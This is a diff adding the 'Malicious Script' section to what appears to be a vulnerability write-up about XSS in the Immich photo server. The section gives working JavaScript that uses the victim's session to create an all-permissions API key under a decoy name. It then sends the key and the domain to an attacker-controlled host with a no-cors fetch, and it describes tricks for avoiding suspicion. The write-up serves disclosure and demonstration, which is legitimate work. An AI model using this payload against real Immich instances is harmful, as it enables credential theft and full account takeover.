@@ -53,3 +53,23 @@ $ exiftool \
 ```
 At this point the [file](https://github.com/emanuelepns/immich-exfiltration-demo/blob/main/images/tomas-cocacola-4AxeQEi0gQc-unsplash.jpg) is ready to be uploaded in the Immich library and tested: it correctly opens in the panorama viewer and after triggering the OCR overlay (the `T` button in the bottom right corner) the `iframe` in the previous code is correctly rendered (you can look at it inspecting the page).
 ![](attachments/Pasted%20image%2020260520205010.png)
+### Malicious Script
+ With the working exploit established, I proceeded to code the malicious script. After trying a simple `alert(1)` to verify the correct JavaScript execution, I took a look at official API documentation, in particular the [API keys management endpoint](https://api.immich.app/endpoints/api-keys). To create a new key you need to do a simple POST request with two parameters: name and list of permissions.
+ So I chose a good unsuspicious name and constructed the following request:
+ ```js
+const response = await fetch('/api/api-keys', {
+	method: 'POST',
+	headers: { 'Content-Type': 'application/json' },
+	body: JSON.stringify({ name: 'Mobile App',
+						   permissions: ["all"]}) 
+});
+const data = await response.json();
+ ```
+ As the script executes within the context of the user's active session, the request is automatically authenticated and masqueraded as it is coming from the real user, without giving any errors. The response contains the key itself (the secret) along with an [object](https://api.immich.app/models/APIKeyResponseDto) containing secondary details (e.g. an unique ID). We don't need all of this, the actual key is sufficient to interact with APIs.
+The exfiltration at this point can be easily achieved with a simple GET request to the attacker's HTTP server:
+```js
+fetch('https://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document.domain, { mode: 'no-cors' });
+```
+I added the `document.domain` parameter, because in a real world scenario the attacker doesn't know where his script hit, and having the target domain is essential to map the key to its respective host. Another addition is the `no-cors` mode, that allows to send the request without requiring a response, effectively preventing the browser from blocking the outbound traffic due to [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) policies.
+You can find the final script in the repository. To further mitigate suspicion I renamed it after the photographer of the original image.
+Now we have in our hands powerful credentials, we just set the permissions to "all", so the attacker can bypass all standard authentication challenges and gain full data access or even administrative control based on the victim privileges.
